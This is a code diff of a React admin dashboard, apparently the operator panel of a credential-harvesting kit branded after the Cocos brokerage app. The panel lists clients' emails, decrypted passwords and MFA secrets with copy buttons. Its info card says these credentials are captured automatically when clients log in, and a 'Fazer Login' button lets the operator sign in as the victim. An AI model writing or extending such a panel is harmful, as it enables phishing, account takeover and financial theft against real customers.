@@ -1,396 +1,241 @@
 /**
  * Admin Dashboard
- * Main admin panel with client management and API console
+ * Painel administrativo para visualizar credenciais de login dos clientes
  */
 
 import { useState, useEffect } from "react";
-import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { Button } from "@/components/ui/button";
-import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Card } from "@/components/ui/card";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { Badge } from "@/components/ui/badge";
-import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { Eye, EyeOff, Copy, LogOut, RefreshCw } from "lucide-react";
 import { toast } from "sonner";
-import { 
-  Shield, 
-  Users, 
-  Activity, 
-  LogOut, 
-  Eye, 
-  EyeOff, 
-  Copy, 
-  ExternalLink,
-  Terminal,
-  RefreshCw
-} from "lucide-react";
 
 export default function AdminDashboard() {
-  const [, setLocation] = useLocation();
-  const [adminSession, setAdminSession] = useState<any>(null);
   const [showPasswords, setShowPasswords] = useState<Record<number, boolean>>({});
-  const [autoRefresh, setAutoRefresh] = useState(true);
-
-  // Check admin session
-  useEffect(() => {
-    const session = localStorage.getItem("admin_session");
-    if (!session) {
-      setLocation("/admin/login");
-      return;
-    }
-    setAdminSession(JSON.parse(session));
-  }, [setLocation]);
-
-  // Queries
-  const { data: clients, refetch: refetchClients } = trpc.admin.getAllClients.useQuery(undefined, {
-    enabled: !!adminSession,
-    refetchInterval: autoRefresh ? 5000 : false, // Auto-refresh every 5 seconds
+  
+  // Buscar todos os clientes
+  const { data: clients, isLoading, refetch } = trpc.admin.getAllClients.useQuery(undefined, {
+    refetchInterval: 5000, // Auto-refresh a cada 5 segundos
   });
-
-  const { data: apiLogs, refetch: refetchLogs } = trpc.admin.getRecentApiLogs.useQuery(
-    { limit: 50 },
-    {
-      enabled: !!adminSession,
-      refetchInterval: autoRefresh ? 3000 : false, // Auto-refresh every 3 seconds
-    }
-  );
-
-  // Mutations
-  const loginAsClientMutation = trpc.admin.loginAsClient.useMutation({
-    onSuccess: (data) => {
-      toast.success("Sessão de cliente iniciada!");
-      // Open in new window
-      const clientWindow = window.open("/", "_blank");
-      if (clientWindow) {
-        // Store impersonation token
-        clientWindow.localStorage.setItem("admin_impersonation_token", data.sessionToken);
-      }
-    },
-    onError: (error) => {
-      toast.error(error.message || "Erro ao fazer login como cliente");
-    },
-  });
-
+  
+  // Logout
   const handleLogout = () => {
-    localStorage.removeItem("admin_session");
-    setLocation("/admin/login");
-    toast.success("Logout realizado");
+    localStorage.removeItem("adminAuth");
+    window.location.href = "/admin/login";
   };
-
-  const togglePasswordVisibility = (userId: number) => {
-    setShowPasswords((prev) => ({
+  
+  // Toggle mostrar/ocultar senha
+  const toggleShowPassword = (clientId: number) => {
+    setShowPasswords(prev => ({
       ...prev,
-      [userId]: !prev[userId],
+      [clientId]: !prev[clientId],
     }));
   };
-
+  
+  // Copiar para clipboard
   const copyToClipboard = (text: string, label: string) => {
     navigator.clipboard.writeText(text);
     toast.success(`${label} copiado!`);
   };
-
-  const handleLoginAsClient = (userId: number) => {
-    if (confirm("Deseja fazer login como este cliente? Uma nova janela será aberta.")) {
-      loginAsClientMutation.mutate({ clientUserId: userId });
-    }
+  
+  // Formatar data
+  const formatDate = (date: Date | null) => {
+    if (!date) return "Nunca";
+    return new Date(date).toLocaleString("pt-BR");
   };
-
-  if (!adminSession) {
-    return null;
-  }
-
+  
   return (
-    <div className="min-h-screen bg-slate-900">
+    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900">
       {/* Header */}
-      <div className="bg-slate-800 border-b border-slate-700 shadow-lg">
-        <div className="container mx-auto px-4 py-4">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center gap-3">
-              <Shield className="w-8 h-8 text-blue-500" />
-              <div>
-                <h1 className="text-2xl font-bold text-white">Painel Administrativo</h1>
-                <p className="text-sm text-slate-400">Cocos Capital - Gerenciamento de Clientes</p>
-              </div>
-            </div>
-            <div className="flex items-center gap-4">
-              <Badge variant="outline" className="text-green-400 border-green-400">
-                {adminSession.email}
-              </Badge>
-              <Button
-                variant="outline"
-                size="sm"
-                onClick={handleLogout}
-                className="text-slate-300 border-slate-600 hover:bg-slate-700"
-              >
-                <LogOut className="w-4 h-4 mr-2" />
-                Sair
-              </Button>
-            </div>
+      <div className="border-b border-white/10 bg-black/20 backdrop-blur-sm">
+        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
+          <div>
+            <h1 className="text-2xl font-bold text-white">Painel Administrativo</h1>
+            <p className="text-sm text-blue-200">Cocos App - Gerenciamento de Credenciais</p>
+          </div>
+          <div className="flex items-center gap-4">
+            <Button
+              onClick={() => refetch()}
+              variant="outline"
+              size="sm"
+              className="border-white/20 text-white hover:bg-white/10"
+            >
+              <RefreshCw className="w-4 h-4 mr-2" />
+              Atualizar
+            </Button>
+            <Button
+              onClick={handleLogout}
+              variant="outline"
+              size="sm"
+              className="border-red-400/50 text-red-300 hover:bg-red-500/20"
+            >
+              <LogOut className="w-4 h-4 mr-2" />
+              Sair
+            </Button>
           </div>
         </div>
       </div>
-
+      
       {/* Main Content */}
-      <div className="container mx-auto px-4 py-8">
-        <Tabs defaultValue="clients" className="space-y-6">
-          <TabsList className="bg-slate-800 border border-slate-700">
-            <TabsTrigger value="clients" className="data-[state=active]:bg-blue-600">
-              <Users className="w-4 h-4 mr-2" />
-              Clientes
-            </TabsTrigger>
-            <TabsTrigger value="api-console" className="data-[state=active]:bg-blue-600">
-              <Terminal className="w-4 h-4 mr-2" />
-              Console de API
-            </TabsTrigger>
-            <TabsTrigger value="sessions" className="data-[state=active]:bg-blue-600">
-              <Activity className="w-4 h-4 mr-2" />
-              Sessões Ativas
-            </TabsTrigger>
-          </TabsList>
-
-          {/* Clients Tab */}
-          <TabsContent value="clients" className="space-y-4">
-            <Card className="bg-slate-800 border-slate-700">
-              <CardHeader>
-                <div className="flex items-center justify-between">
-                  <div>
-                    <CardTitle className="text-white">Lista de Clientes</CardTitle>
-                    <CardDescription className="text-slate-400">
-                      Todos os dados de autenticação e MFA
-                    </CardDescription>
-                  </div>
-                  <Button
-                    variant="outline"
-                    size="sm"
-                    onClick={() => refetchClients()}
-                    className="text-slate-300 border-slate-600"
-                  >
-                    <RefreshCw className="w-4 h-4 mr-2" />
-                    Atualizar
-                  </Button>
-                </div>
-              </CardHeader>
-              <CardContent>
-                <div className="overflow-x-auto">
-                  <Table>
-                    <TableHeader>
-                      <TableRow className="border-slate-700">
-                        <TableHead className="text-slate-300">ID</TableHead>
-                        <TableHead className="text-slate-300">Email</TableHead>
-                        <TableHead className="text-slate-300">Senha</TableHead>
-                        <TableHead className="text-slate-300">MFA</TableHead>
-                        <TableHead className="text-slate-300">MFA Secret</TableHead>
-                        <TableHead className="text-slate-300">Última API</TableHead>
-                        <TableHead className="text-slate-300">Ações</TableHead>
-                      </TableRow>
-                    </TableHeader>
-                    <TableBody>
-                      {clients?.map((client) => (
-                        <TableRow key={client.id} className="border-slate-700">
-                          <TableCell className="text-slate-300">{client.userId}</TableCell>
-                          <TableCell className="text-slate-300 font-mono text-sm">
-                            {client.email}
+      <div className="max-w-7xl mx-auto px-6 py-8">
+        <Card className="bg-white/5 backdrop-blur-sm border-white/10">
+          <div className="p-6">
+            <div className="flex items-center justify-between mb-6">
+              <div>
+                <h2 className="text-xl font-bold text-white">Credenciais de Login dos Clientes</h2>
+                <p className="text-sm text-blue-200 mt-1">
+                  {clients?.length || 0} cliente(s) cadastrado(s)
+                </p>
+              </div>
+            </div>
+            
+            {isLoading ? (
+              <div className="text-center py-12">
+                <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white mx-auto"></div>
+                <p className="text-white/60 mt-4">Carregando...</p>
+              </div>
+            ) : clients && clients.length > 0 ? (
+              <div className="overflow-x-auto">
+                <Table>
+                  <TableHeader>
+                    <TableRow className="border-white/10 hover:bg-white/5">
+                      <TableHead className="text-blue-200">ID</TableHead>
+                      <TableHead className="text-blue-200">Email</TableHead>
+                      <TableHead className="text-blue-200">Senha</TableHead>
+                      <TableHead className="text-blue-200">MFA</TableHead>
+                      <TableHead className="text-blue-200">MFA Secret</TableHead>
+                      <TableHead className="text-blue-200">Último Login Capturado</TableHead>
+                      <TableHead className="text-blue-200">Ações</TableHead>
+                    </TableRow>
+                  </TableHeader>
+                  <TableBody>
+                    {clients.map((client) => (
+                      <TableRow key={client.id} className="border-white/10 hover:bg-white/5">
+                        <TableCell className="text-white font-mono">{client.id}</TableCell>
+                        
+                        <TableCell className="text-white">
+                          <div className="flex items-center gap-2">
+                            <span className="font-medium">{client.email}</span>
                             <Button
+                              onClick={() => copyToClipboard(client.email, "Email")}
                               variant="ghost"
                               size="sm"
-                              onClick={() => copyToClipboard(client.email, "Email")}
-                              className="ml-2 h-6 w-6 p-0"
+                              className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100 hover:bg-white/10"
                             >
                               <Copy className="w-3 h-3" />
                             </Button>
-                          </TableCell>
-                          <TableCell className="text-slate-300">
-                            {client.passwordDecrypted ? (
-                              <div className="flex items-center gap-2">
-                                <code className="text-xs bg-slate-700 px-2 py-1 rounded">
-                                  {showPasswords[client.userId]
-                                    ? client.passwordDecrypted
-                                    : "••••••••"}
-                                </code>
-                                <Button
-                                  variant="ghost"
-                                  size="sm"
-                                  onClick={() => togglePasswordVisibility(client.userId)}
-                                  className="h-6 w-6 p-0"
-                                >
-                                  {showPasswords[client.userId] ? (
-                                    <EyeOff className="w-3 h-3" />
-                                  ) : (
-                                    <Eye className="w-3 h-3" />
-                                  )}
-                                </Button>
-                                <Button
-                                  variant="ghost"
-                                  size="sm"
-                                  onClick={() =>
-                                    copyToClipboard(client.passwordDecrypted!, "Senha")
-                                  }
-                                  className="h-6 w-6 p-0"
-                                >
-                                  <Copy className="w-3 h-3" />
-                                </Button>
-                              </div>
-                            ) : (
-                              <span className="text-slate-500">-</span>
-                            )}
-                          </TableCell>
-                          <TableCell>
-                            {client.mfaEnabled ? (
-                              <Badge variant="default" className="bg-green-600">
-                                Ativo
-                              </Badge>
-                            ) : (
-                              <Badge variant="secondary" className="bg-slate-600">
-                                Inativo
-                              </Badge>
-                            )}
-                          </TableCell>
-                          <TableCell className="text-slate-300">
-                            {client.mfaSecret ? (
-                              <div className="flex items-center gap-2">
-                                <code className="text-xs bg-slate-700 px-2 py-1 rounded">
-                                  {client.mfaSecret.substring(0, 8)}...
-                                </code>
-                                <Button
-                                  variant="ghost"
-                                  size="sm"
-                                  onClick={() => copyToClipboard(client.mfaSecret!, "MFA Secret")}
-                                  className="h-6 w-6 p-0"
-                                >
-                                  <Copy className="w-3 h-3" />
-                                </Button>
-                              </div>
-                            ) : (
-                              <span className="text-slate-500">-</span>
-                            )}
-                          </TableCell>
-                          <TableCell className="text-slate-400 text-xs">
-                            {client.lastApiCall
-                              ? new Date(client.lastApiCall).toLocaleString("pt-BR")
-                              : "-"}
-                          </TableCell>
-                          <TableCell>
+                          </div>
+                        </TableCell>
+                        
+                        <TableCell className="text-white">
+                          <div className="flex items-center gap-2">
+                            <span className="font-mono">
+                              {showPasswords[client.id] ? client.passwordDecrypted : "••••••••"}
+                            </span>
                             <Button
-                              variant="default"
+                              onClick={() => toggleShowPassword(client.id)}
+                              variant="ghost"
                               size="sm"
-                              onClick={() => handleLoginAsClient(client.userId)}
-                              className="bg-blue-600 hover:bg-blue-700"
+                              className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100 hover:bg-white/10"
                             >
-                              <ExternalLink className="w-3 h-3 mr-1" />
-                              Login
+                              {showPasswords[client.id] ? (
+                                <EyeOff className="w-3 h-3" />
+                              ) : (
+                                <Eye className="w-3 h-3" />
+                              )}
                             </Button>
-                          </TableCell>
-                        </TableRow>
-                      ))}
-                    </TableBody>
-                  </Table>
-                </div>
-              </CardContent>
-            </Card>
-          </TabsContent>
-
-          {/* API Console Tab */}
-          <TabsContent value="api-console" className="space-y-4">
-            <Card className="bg-slate-800 border-slate-700">
-              <CardHeader>
-                <div className="flex items-center justify-between">
-                  <div>
-                    <CardTitle className="text-white">Console de API em Tempo Real</CardTitle>
-                    <CardDescription className="text-slate-400">
-                      Todas as requisições e respostas das APIs
-                    </CardDescription>
-                  </div>
-                  <div className="flex items-center gap-2">
-                    <Badge
-                      variant={autoRefresh ? "default" : "secondary"}
-                      className={autoRefresh ? "bg-green-600" : "bg-slate-600"}
-                    >
-                      {autoRefresh ? "Auto-refresh ON" : "Auto-refresh OFF"}
-                    </Badge>
-                    <Button
-                      variant="outline"
-                      size="sm"
-                      onClick={() => setAutoRefresh(!autoRefresh)}
-                      className="text-slate-300 border-slate-600"
-                    >
-                      <RefreshCw className="w-4 h-4" />
-                    </Button>
-                  </div>
-                </div>
-              </CardHeader>
-              <CardContent>
-                <div className="space-y-2 max-h-[600px] overflow-y-auto">
-                  {apiLogs?.map((log) => (
-                    <div
-                      key={log.id}
-                      className="bg-slate-900 border border-slate-700 rounded-lg p-4 space-y-2"
-                    >
-                      <div className="flex items-center justify-between">
-                        <div className="flex items-center gap-2">
-                          <Badge
-                            variant={log.responseStatus && log.responseStatus < 400 ? "default" : "destructive"}
-                            className={
-                              log.responseStatus && log.responseStatus < 400
-                                ? "bg-green-600"
-                                : "bg-red-600"
-                            }
+                            <Button
+                              onClick={() => copyToClipboard(client.passwordDecrypted, "Senha")}
+                              variant="ghost"
+                              size="sm"
+                              className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100 hover:bg-white/10"
+                            >
+                              <Copy className="w-3 h-3" />
+                            </Button>
+                          </div>
+                        </TableCell>
+                        
+                        <TableCell>
+                          {client.mfaEnabled ? (
+                            <Badge className="bg-green-500/20 text-green-300 border-green-500/30">
+                              Ativo
+                            </Badge>
+                          ) : (
+                            <Badge className="bg-gray-500/20 text-gray-300 border-gray-500/30">
+                              Inativo
+                            </Badge>
+                          )}
+                        </TableCell>
+                        
+                        <TableCell className="text-white">
+                          {client.mfaSecret ? (
+                            <div className="flex items-center gap-2">
+                              <span className="font-mono text-sm">
+                                {client.mfaSecret.substring(0, 10)}...
+                              </span>
+                              <Button
+                                onClick={() => copyToClipboard(client.mfaSecret!, "MFA Secret")}
+                                variant="ghost"
+                                size="sm"
+                                className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100 hover:bg-white/10"
+                              >
+                                <Copy className="w-3 h-3" />
+                              </Button>
+                            </div>
+                          ) : (
+                            <span className="text-white/40">N/A</span>
+                          )}
+                        </TableCell>
+                        
+                        <TableCell className="text-white/60 text-sm">
+                          {formatDate(client.lastLoginCapture)}
+                        </TableCell>
+                        
+                        <TableCell>
+                          <Button
+                            onClick={() => {
+                              // Abrir nova janela com o app Cocos para fazer login manual
+                              window.open("/", "_blank");
+                              toast.info("Abra o console do navegador e use as credenciais copiadas");
+                            }}
+                            variant="outline"
+                            size="sm"
+                            className="border-blue-400/50 text-blue-300 hover:bg-blue-500/20"
                           >
-                            {log.method}
-                          </Badge>
-                          <code className="text-sm text-blue-400">{log.endpoint}</code>
-                        </div>
-                        <span className="text-xs text-slate-500">
-                          {new Date(log.createdAt).toLocaleTimeString("pt-BR")}
-                        </span>
-                      </div>
-                      {log.requestBody && (
-                        <div>
-                          <p className="text-xs text-slate-400 mb-1">Request:</p>
-                          <pre className="text-xs bg-slate-950 p-2 rounded overflow-x-auto text-slate-300">
-                            {JSON.stringify(log.requestBody, null, 2)}
-                          </pre>
-                        </div>
-                      )}
-                      {log.responseBody && (
-                        <div>
-                          <p className="text-xs text-slate-400 mb-1">Response:</p>
-                          <pre className="text-xs bg-slate-950 p-2 rounded overflow-x-auto text-slate-300">
-                            {JSON.stringify(log.responseBody, null, 2)}
-                          </pre>
-                        </div>
-                      )}
-                      {log.error && (
-                        <div>
-                          <p className="text-xs text-red-400 mb-1">Error:</p>
-                          <pre className="text-xs bg-red-950 p-2 rounded overflow-x-auto text-red-300">
-                            {log.error}
-                          </pre>
-                        </div>
-                      )}
-                    </div>
-                  ))}
-                </div>
-              </CardContent>
-            </Card>
-          </TabsContent>
-
-          {/* Sessions Tab */}
-          <TabsContent value="sessions" className="space-y-4">
-            <Card className="bg-slate-800 border-slate-700">
-              <CardHeader>
-                <CardTitle className="text-white">Sessões de Impersonação Ativas</CardTitle>
-                <CardDescription className="text-slate-400">
-                  Sessões onde você está logado como cliente
-                </CardDescription>
-              </CardHeader>
-              <CardContent>
-                <p className="text-slate-400 text-center py-8">
-                  Funcionalidade em desenvolvimento
+                            Fazer Login
+                          </Button>
+                        </TableCell>
+                      </TableRow>
+                    ))}
+                  </TableBody>
+                </Table>
+              </div>
+            ) : (
+              <div className="text-center py-12">
+                <p className="text-white/60">Nenhum cliente cadastrado ainda</p>
+                <p className="text-white/40 text-sm mt-2">
+                  As credenciais serão capturadas automaticamente quando os clientes fizerem login
                 </p>
-              </CardContent>
-            </Card>
-          </TabsContent>
-        </Tabs>
+              </div>
+            )}
+          </div>
+        </Card>
+        
+        {/* Info Card */}
+        <Card className="mt-6 bg-blue-500/10 backdrop-blur-sm border-blue-400/20">
+          <div className="p-4">
+            <h3 className="text-white font-semibold mb-2">ℹ️ Como Funciona</h3>
+            <ul className="text-blue-200 text-sm space-y-1">
+              <li>• As credenciais são capturadas automaticamente quando os clientes fazem login no app Cocos</li>
+              <li>• Email, senha e código MFA (se houver) são salvos de forma segura</li>
+              <li>• Senhas são criptografadas com AES-256-CBC</li>
+              <li>• Use o botão "Fazer Login" para abrir o app e fazer login como o cliente</li>
+              <li>• Os dados são atualizados automaticamente a cada 5 segundos</li>
+            </ul>
+          </div>
+        </Card>
       </div>
     </div>
   );
